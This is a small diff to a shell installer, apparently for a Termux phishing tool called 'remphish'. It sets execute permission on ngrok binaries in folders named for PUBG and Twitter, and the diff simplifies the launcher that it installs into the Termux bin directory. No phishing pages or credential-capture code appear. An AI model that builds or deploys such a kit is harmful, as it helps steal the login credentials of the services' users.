@@ -23,11 +23,9 @@ chmod +x ~/remphish/pubg/ngrok
 chmod +x ~/remphish/twitter/ngrok
 cd
 cat <<EOF>~/url
-cd
-cd remphish
-bash Start.sh
+bash ~/remphish/Start.sh
 EOF
-cp ~/url /data/data/com.termux/files/usr/bin/remphish
+cp -f ~/url /data/data/com.termux/files/usr/bin/remphish
 chmod +x /data/data/com.termux/files/usr/bin/remphish
 cd
 rm -rf url
